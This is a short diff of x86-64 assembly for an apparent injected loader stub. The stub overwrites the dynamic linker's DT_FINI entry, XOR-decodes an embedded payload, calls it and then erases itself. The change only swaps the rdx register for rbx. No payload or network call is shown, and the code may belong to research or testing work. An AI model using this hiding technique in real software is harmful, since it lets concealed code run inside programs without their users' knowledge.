@@ -7,8 +7,9 @@
 .endm
 
 _begin:
-    lea rdx, [rip+_begin-24]
-    mov rdi, [rdx] /* &_dl_argv */
+    push rbx
+    lea rbx, [rip+_begin-24]
+    mov rdi, [rbx] /* &_dl_argv */
 
     // Optimized (for size) loop for skipping argv
     movqq rcx, rdi
@@ -37,14 +38,14 @@ env_check_loop:
 
 env_check_okay:
     // Overwrite dl_info[DT_FINI] in link_map
-    mov rdi, [rdx+8]
-    mov rax, [rdx+16]
+    mov rdi, [rbx+8]
+    mov rax, [rbx+16]
     stosq
 
     // Decode payload
     movqq rcx, PAYLOAD_SIZE_IN_WORDS
-    // lea rdi, [rdx+(_end-_begin)+24] GNU AS outputs 488dba6d000000, why ._.
-    .byte 0x48, 0x8d, 0x7a, (_end-_begin)+24+8
+    // lea rdi, [rbx+(_end-_begin)+24] GNU AS outputs 488dba6d000000, why ._.
+    .byte 0x48, 0x8d, 0x7b, (_end-_begin)+24+8
     xor eax, eax
 decode_loop:
     xor [rdi+rcx*4], eax
@@ -52,12 +53,11 @@ decode_loop:
     loop decode_loop
     lea rax, [rdi-8]
     lea rdi, [rdi+PAYLOAD_TIME_IMM_OFFSET]
-    push rdx
     call [rax]
-    pop rdx
 bye:
     // Zeroing self
-    movqq rdi, rdx
+    movqq rdi, rbx
+    pop rbx
     // GNU AS (2.40) is too stupid: it assembles "push _fin-_begin+24" into a 0x68 (4 byte push) instead of single byte one.
     .byte 0x6A
     .byte _fin-_begin+24
